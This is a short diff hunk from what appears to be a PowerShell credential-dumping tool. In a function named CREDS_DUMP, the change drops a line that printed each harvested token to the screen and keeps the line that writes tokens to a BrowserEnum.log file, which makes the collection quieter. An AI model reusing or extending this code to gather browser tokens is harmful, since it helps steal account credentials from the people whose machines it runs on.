@@ -581,7 +581,6 @@ function CREDS_DUMP {
         }else{
             ## Loop in each string found
             ForEach($token in $Json){
-                write-host "Token: $token" -foregroundcolor green
                 echo "$token" >> $LogFilePath\BrowserEnum.log
             }
         }
